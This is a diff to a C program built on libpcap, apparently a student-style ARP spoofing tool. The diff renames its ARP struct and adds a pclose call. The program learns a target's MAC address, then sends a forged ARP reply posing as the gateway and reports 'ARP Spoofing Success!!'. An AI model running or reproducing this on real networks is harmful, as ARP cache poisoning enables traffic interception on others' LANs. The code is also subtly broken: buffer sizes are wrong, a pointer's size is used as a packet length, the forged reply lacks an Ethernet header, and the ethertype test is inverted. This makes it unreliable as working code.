@@ -16,7 +16,7 @@ struct eth_header {
 	uint16_t type;
 };
 
-struct arp_packet {
+struct arp_header {
 	uint16_t hw_type;
 	uint16_t protocol;
 	uint8_t hw_addr_len;
@@ -29,21 +29,21 @@ struct arp_packet {
 };
 #pragma pack(8)
 
-void init(struct eth_header* eth_hdr, struct arp_packet* arp_pk) {
+void init(struct eth_header* eth_hdr, struct arp_header* arp_hdr) {
 	eth_hdr->type = htons(0x0806);
-	arp_pk->hw_type = htons(0x0001);
-	arp_pk->protocol = htons(0x0800);
-	arp_pk->hw_addr_len = 0x06;
-	arp_pk->protocol_addr_len = 0x04;
+	arp_hdr->hw_type = htons(0x0001);
+	arp_hdr->protocol = htons(0x0800);
+	arp_hdr->hw_addr_len = 0x06;
+	arp_hdr->protocol_addr_len = 0x04;
 	for (int i=0; i<6; i++) {
 		eth_hdr->dest_mac[i] = 0xff;
-		arp_pk->target_mac[i] = 0x00;
+		arp_hdr->target_mac[i] = 0x00;
 	}
-	arp_pk->opcode = htons(REQUEST);
+	arp_hdr->opcode = htons(REQUEST);
 }
 
-void print_packet(struct eth_header* eth_hdr, struct arp_packet* arp_pk) {
-	printf("PACKET SIZE: %d\n", sizeof(*arp_pk));
+void print_packet(struct eth_header* eth_hdr, struct arp_header* arp_hdr) {
+	printf("PACKET SIZE: %d\n", sizeof(*arp_hdr));
 	printf("---------------------------------------------------\n");
 	printf("ether_src_mac: %02x:%02x:%02x:%02x:%02x:%02x\n",
  eth_hdr->src_mac[0], eth_hdr->src_mac[1], eth_hdr->src_mac[2],
@@ -53,18 +53,18 @@ void print_packet(struct eth_header* eth_hdr, struct arp_packet* arp_pk) {
  eth_hdr->dest_mac[3], eth_hdr->dest_mac[4], eth_hdr->dest_mac[5]);
 	printf("ethernet type: %04x\n", ntohs(eth_hdr->type));
 	printf("---------------------------------------------------\n");
-	printf("hw_type: %04x\n", ntohs(arp_pk->hw_type));
-	printf("protocol: %04x\n", ntohs(arp_pk->protocol));
-	printf("hw_addr_len: %02x\n", arp_pk->hw_addr_len);
-	printf("protocol_addr_len: %02x\n", arp_pk->protocol_addr_len);
-	printf("sender_ip: %08x\n", arp_pk->sender_ip);
-	printf("target_ip: %08x\n", arp_pk->target_ip);
+	printf("hw_type: %04x\n", ntohs(arp_hdr->hw_type));
+	printf("protocol: %04x\n", ntohs(arp_hdr->protocol));
+	printf("hw_addr_len: %02x\n", arp_hdr->hw_addr_len);
+	printf("protocol_addr_len: %02x\n", arp_hdr->protocol_addr_len);
+	printf("sender_ip: %08x\n", arp_hdr->sender_ip);
+	printf("target_ip: %08x\n", arp_hdr->target_ip);
 	printf("sender_mac: %02x:%02x:%02x:%02x:%02x:%02x\n",
- arp_pk->sender_mac[0], arp_pk->sender_mac[1], arp_pk->sender_mac[2],
- arp_pk->sender_mac[3], arp_pk->sender_mac[4], arp_pk->sender_mac[5]);
+ arp_hdr->sender_mac[0], arp_hdr->sender_mac[1], arp_hdr->sender_mac[2],
+ arp_hdr->sender_mac[3], arp_hdr->sender_mac[4], arp_hdr->sender_mac[5]);
 	printf("target_mac: %02x:%02x:%02x:%02x:%02x:%02x\n",
- arp_pk->target_mac[0], arp_pk->target_mac[1], arp_pk->target_mac[2],
- arp_pk->target_mac[3], arp_pk->target_mac[4], arp_pk->target_mac[5]);
+ arp_hdr->target_mac[0], arp_hdr->target_mac[1], arp_hdr->target_mac[2],
+ arp_hdr->target_mac[3], arp_hdr->target_mac[4], arp_hdr->target_mac[5]);
 }
 
 int getMyMac(char* interface, uint8_t* res) {
@@ -96,6 +96,7 @@ int getMyMac(char* interface, uint8_t* res) {
 		i++;
 		res[j] = (tmp1 << 4) | tmp2;
 	}
+	pclose(fp);
 	return 0;
 }
 
@@ -122,7 +123,7 @@ int main(int argc, char* argv[]) {
 		return -1;
 	}
 	struct eth_header *eth_hdr = (struct eth_header*) malloc(sizeof(struct eth_header));
-	struct arp_packet *arp_pk = (struct arp_packet*) malloc(sizeof(struct arp_packet));
+	struct arp_header *arp_hdr = (struct arp_header*) malloc(sizeof(struct arp_header));
 	
 	uint32_t sip = my_inet_aton(argv[2]);
 	uint32_t dip = my_inet_aton(argv[3]);
@@ -132,10 +133,10 @@ int main(int argc, char* argv[]) {
 	}
 
 	for (int i=0; i<6; i++) 
-		eth_hdr->src_mac[i] = arp_pk->sender_mac[i] = smac[i];
-	arp_pk->sender_ip = sip;
-	arp_pk->target_ip = dip;
-	init(eth_hdr, arp_pk);
+		eth_hdr->src_mac[i] = arp_hdr->sender_mac[i] = smac[i];
+	arp_hdr->sender_ip = sip;
+	arp_hdr->target_ip = dip;
+	init(eth_hdr, arp_hdr);
 
 	char* dev = argv[1];
 	char errbuf[PCAP_ERRBUF_SIZE];
@@ -146,12 +147,12 @@ int main(int argc, char* argv[]) {
 	}
 
 	int eth_size = sizeof(*eth_hdr);
-	int arp_size = sizeof(*arp_pk);
+	int arp_size = sizeof(*arp_hdr);
 	u_char* packet = (u_char*) malloc(sizeof(eth_size+arp_size));
 	memcpy(packet, eth_hdr, eth_size);
-	memcpy(packet+14, arp_pk, arp_size);
+	memcpy(packet+14, arp_hdr, arp_size);
 	printf("ARP Request==========================================\n");
-	print_packet(eth_hdr, arp_pk);
+	print_packet(eth_hdr, arp_hdr);
 	printf("=====================================================\n");
 
 	if (pcap_sendpacket(handle, packet, eth_size+arp_size) == -1) {
@@ -161,7 +162,7 @@ int main(int argc, char* argv[]) {
 
 	struct pcap_pkthdr *header = NULL;
 	struct eth_header* recv_eth_hdr = NULL;
-	struct arp_packet* recv_arp_pk = NULL;
+	struct arp_header* recv_arp_hdr = NULL;
 	memset(packet, 0, sizeof(eth_size+arp_size));
 	while (1) {
 		int res = pcap_next_ex(handle, &header, ((const u_char**)&packet));
@@ -169,23 +170,23 @@ int main(int argc, char* argv[]) {
 		if (res < 0) break;
 		if (res == 0) continue;
 		recv_eth_hdr = (struct eth_header*) packet;
-		recv_arp_pk = (struct arp_packet*) (packet + 14);
+		recv_arp_hdr = (struct arp_header*) (packet + 14);
 		if (ntohs(recv_eth_hdr->type) != ETHERTYPE_ARP) {
-			if (recv_arp_pk->sender_ip == arp_pk->target_ip) {
+			if (recv_arp_hdr->sender_ip == arp_hdr->target_ip) {
 				printf("ARP Reply============================================\n");
-				print_packet(recv_eth_hdr, recv_arp_pk);
+				print_packet(recv_eth_hdr, recv_arp_hdr);
 				printf("=====================================================\n");
 				printf("TARGET MAC: ");
 				for(int i=0; i<6; i++) {
-					arp_pk->target_mac[i] = recv_eth_hdr->src_mac[i];
+					arp_hdr->target_mac[i] = recv_eth_hdr->src_mac[i];
 					printf("%02x ", recv_eth_hdr->src_mac[i]);
 				}
-				printf("TARGET IP: %04x\n", recv_arp_pk->sender_ip);
+				printf("TARGET IP: %04x\n", recv_arp_hdr->sender_ip);
 				printf("=====================================================\n");
-				arp_pk->target_ip = recv_arp_pk->sender_ip;
-				arp_pk->sender_ip = ((recv_arp_pk->sender_ip & 0x00FFFFFF)) | 0x01000000; // to gateway addr
-				arp_pk->opcode = htons(REPLY);
-				if (pcap_sendpacket(handle, (const u_char*)arp_pk, sizeof(arp_pk)) == -1) {
+				arp_hdr->target_ip = recv_arp_hdr->sender_ip;
+				arp_hdr->sender_ip = ((recv_arp_hdr->sender_ip & 0x00FFFFFF)) | 0x01000000; // to gateway addr
+				arp_hdr->opcode = htons(REPLY);
+				if (pcap_sendpacket(handle, (const u_char*)arp_hdr, sizeof(arp_hdr)) == -1) {
 					printf("ARP Spoofing Failure\n");
 				} else {
 					printf("ARP Spoofing Success!!\n");
@@ -195,7 +196,7 @@ int main(int argc, char* argv[]) {
 	}
 
 	free(packet);
-	free(arp_pk);
+	free(arp_hdr);
 	free(eth_hdr);
 	pcap_close(handle);
 	return 0; 
